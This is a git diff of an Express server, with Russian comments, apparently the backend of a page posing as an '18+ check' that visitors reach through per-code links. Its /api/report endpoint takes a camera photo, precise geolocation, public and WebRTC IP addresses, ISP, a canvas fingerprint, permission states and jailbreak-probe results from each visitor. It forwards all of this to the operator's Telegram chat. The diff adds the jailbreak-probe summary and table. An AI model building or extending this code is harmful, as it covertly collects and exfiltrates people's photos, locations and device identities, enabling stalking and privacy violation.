@@ -1,4 +1,4 @@
-// === server/index.js (code -> chat_id, pretty /:code, понятные ошибки) ===
+// === server/index.js (code -> chat_id, pretty /:code, JB summary in caption) ===
 import 'dotenv/config';
 import express from 'express';
 import path from 'path';
@@ -26,7 +26,7 @@ app.use(express.json({ limit: '15mb' }));
 app.use(express.urlencoded({ extended: true, limit: '15mb' }));
 
 // --- CORS
-app.use((req, res, next) => {
+app.use((_, res, next) => {
   res.setHeader('Access-Control-Allow-Origin', STATIC_ORIGIN);
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS, GET');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
@@ -67,7 +67,7 @@ db.prepare(`
 `).run();
 db.prepare(`CREATE INDEX IF NOT EXISTS idx_user_codes_chat_id ON user_codes(chat_id);`).run();
 
-// ---- optional migrate.sql (будет выполнен, если файл есть)
+// ---- optional migrate.sql
 try {
   const migratePath = path.join(__dirname, 'migrate.sql');
   if (fs.existsSync(migratePath)) {
@@ -86,7 +86,6 @@ function requireAdminSecret(req, res, next) {
   }
   next();
 }
-
 function escapeHTML(s = '') {
   return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
 }
@@ -95,7 +94,6 @@ function b64ToBuffer(dataUrl = '') {
   const b64 = i >= 0 ? dataUrl.slice(i + 7) : dataUrl;
   return Buffer.from(b64, 'base64');
 }
-
 async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'report.jpg' }) {
   if (!BOT_TOKEN) throw new Error('No BOT token on server');
   if (!chatId) throw new Error('Missing chat_id');
@@ -115,7 +113,6 @@ async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'repo
   }
   return resp.json();
 }
-
 async function sendMessageToTelegram({ chatId, text, parse_mode = 'HTML' }) {
   if (!BOT_TOKEN) throw new Error('No BOT token on server');
   if (!chatId) throw new Error('Missing chat_id');
@@ -132,7 +129,6 @@ async function sendMessageToTelegram({ chatId, text, parse_mode = 'HTML' }) {
   }
   return resp.json();
 }
-
 function safeJson(obj, space = 0) {
   try { return JSON.stringify(obj, null, space); }
   catch { return String(obj); }
@@ -145,7 +141,7 @@ function short(str, n = 64) {
 
 // ==== health & debug ====
 app.get('/health', (_req, res) => res.json({ ok: true }));
-app.get('/api/debug/db', (req, res) => {
+app.get('/api/debug/db', (_req, res) => {
   try {
     const size = fs.existsSync(DB_PATH) ? fs.statSync(DB_PATH).size : 0;
     const codes = db.prepare('SELECT COUNT(*) AS c FROM user_codes').get().c;
@@ -177,7 +173,7 @@ app.post('/api/register-code', requireAdminSecret, (req, res) => {
 // ==== Pretty URL: /:code -> index.html?code=... ====
 app.get('/:code([a-zA-Z0-9\\-]{3,40})', (req, res) => {
   const code = req.params.code.toString();
-  let html = fs.readFileSync(path.join(PUBLIC_DIR, 'index.html'), 'utf8');
+  let html = fs.readFileSync(path.join(__dirname, 'public', 'index.html'), 'utf8');
   const injected = html.replace(
     /<head>/i,
     `<head><script>history.replaceState(null,'','/index.html?code=${code}');</script>`
@@ -198,16 +194,16 @@ app.get('/api/client-ip', (req, res) => {
   res.json({ ip, country, isp, ua: req.headers['user-agent'] || null });
 });
 
-// ==== API: report (отправка фото + сводка и полный JSON) ====
+// ==== API: report (фото + сводка, JB summary, JB table, полный JSON) ====
 app.post('/api/report', async (req, res) => {
   try {
     const {
       userAgent, platform, iosVersion, isSafari,
       geo, photoBase64, note, code,
 
-      // НОВОЕ (из фронта):
-      client_profile,   // быстрый мультисбор
-      device_check      // { score, label, reasons[], details{...}, ... }
+      // из фронта:
+      client_profile,   // быстрый мультисбор (включая jbProbesActive)
+      device_check      // { score, label, reasons[], details{...} }
     } = req.body || {};
 
     if (!code)        return res.status(400).json({ ok:false, error: 'No code' });
@@ -217,7 +213,7 @@ app.post('/api/report', async (req, res) => {
       .get(String(code).toUpperCase());
     if (!row) return res.status(404).json({ ok:false, error:'Unknown code' });
 
-    // — короткая выжимка для caption (лимит у sendPhoto ~1024 символа)
+    // Алиасы
     const cp = client_profile || {};
     const dc = device_check   || {};
 
@@ -231,6 +227,11 @@ app.post('/api/report', async (req, res) => {
     const locale = cp.locale || {};
     const pubIP = cp.publicIp || {};
 
+    // JB summary
+    const jb = cp.jbProbesActive || {};
+    const jbSum = jb.summary || {};
+    const fp = jb.firstPositive || null;
+
     const caption = [
       '<b>Новый отчёт 18+ проверка</b>',
       `Code: <code>${escapeHTML(String(code).toUpperCase())}</code>`,
@@ -238,6 +239,8 @@ app.post('/api/report', async (req, res) => {
       `Platform: <code>${escapeHTML(platform || '')}</code>`,
       `iOS-like: <code>${escapeHTML(iosVersion ?? '')}</code>  Safari: <code>${escapeHTML(isSafari)}</code>`,
       geo ? `Geo: <code>${escapeHTML(`${geo.lat}, ${geo.lon} ±${geo.acc}m`)}</code>` : 'Geo: <code>нет</code>',
+
+      // краткий мультисбор:
       cp.permissions ? `Perms: <code>geo=${escapeHTML(cp.permissions.geolocation||'?')} cam=${escapeHTML(cp.permissions.camera||'?')} mic=${escapeHTML(cp.permissions.microphone||'?')}</code>` : null,
       pubIP.ip ? `IP: <code>${escapeHTML(pubIP.ip||'?')} ${escapeHTML(pubIP.country||'')}</code> ISP: <code>${escapeHTML(pubIP.isp||pubIP.org||'')}</code>` : 'IP: <code>нет</code>',
       `WebRTC IPs: <code>${webrtcCount}</code>  DC-ISP: <code>${escapeHTML(short(dcWords, 40) || '–')}</code>`,
@@ -247,7 +250,12 @@ app.post('/api/report', async (req, res) => {
       canvas ? `Canvas: <code>${escapeHTML(short(canvas.hash,18))} (${canvas.size})</code>` : null,
       inApp?.isInApp ? `InApp: <code>${escapeHTML((inApp.any||[]).join(','))}</code>` : 'InApp: <code>нет</code>',
       locale?.timeZone ? `TZ: <code>${escapeHTML(locale.timeZone)}</code>` : null,
+
+      // device_check + JB summary
       (dc && (dc.score!=null || dc.label)) ? `Check: <code>${escapeHTML(dc.label||'?')} (${dc.score ?? '?'})</code>` : null,
+      jbSum.label ? `JB: <code>${escapeHTML(jbSum.label)}</code> attempts=<code>${escapeHTML(jbSum.attempts ?? jbSum.checks ?? 0)}</code> totalMs=<code>${escapeHTML(jbSum.totalMs ?? 0)}</code>` : 'JB: <code>n/a</code>',
+      fp?.scheme ? `JB hit: <code>${escapeHTML(fp.scheme)}</code> (${escapeHTML(fp.reason||'reason?')} ~${escapeHTML(fp.durationMs||'0')}ms)` : null,
+
       note ? `Note: <code>${escapeHTML(note)}</code>` : null
     ].filter(Boolean).join('\n');
 
@@ -259,13 +267,31 @@ app.post('/api/report', async (req, res) => {
       photoBuf: buf
     });
 
-    // 2) Полный JSON мультисбора и девайс-чека — отдельными сообщениями (чанки)
+    // 1.1) Компактная таблица JB-попыток (если есть)
+    if (Array.isArray(jb.results) && jb.results.length) {
+      const head = 'scheme | opened | reason | ms';
+      const rows = jb.results.slice(0, 8).map(r => {
+        const s  = String(r.scheme || '').replace(/\s+/g, '');
+        const o  = r.opened ? 'yes' : 'no';
+        const re = (r.reason || (r.opened ? 'signal' : 'timeout'));
+        const ms = (r.durationMs != null ? String(r.durationMs) : '-');
+        return `${s} | ${o} | ${re} | ${ms}`;
+      });
+      const table = [head, ...rows].join('\n');
+      await sendMessageToTelegram({
+        chatId: String(row.chat_id),
+        text: `<b>JB attempts (${jb.results.length})</b>\n<pre>${escapeHTML(table)}</pre>`,
+        parse_mode: 'HTML'
+      });
+    }
+
+    // 2) Полный JSON мультисбора и девайс-чека — чанками
     const fullJson = safeJson({
       geo, userAgent, platform, iosVersion, isSafari,
       client_profile: cp, device_check: dc
     }, 2);
 
-    const CHUNK = 3500; // запас по лимиту 4096
+    const CHUNK = 3500; // запас ниже лимита 4096
     for (let i = 0; i < fullJson.length; i += CHUNK) {
       const part = fullJson.slice(i, i + CHUNK);
       await sendMessageToTelegram({
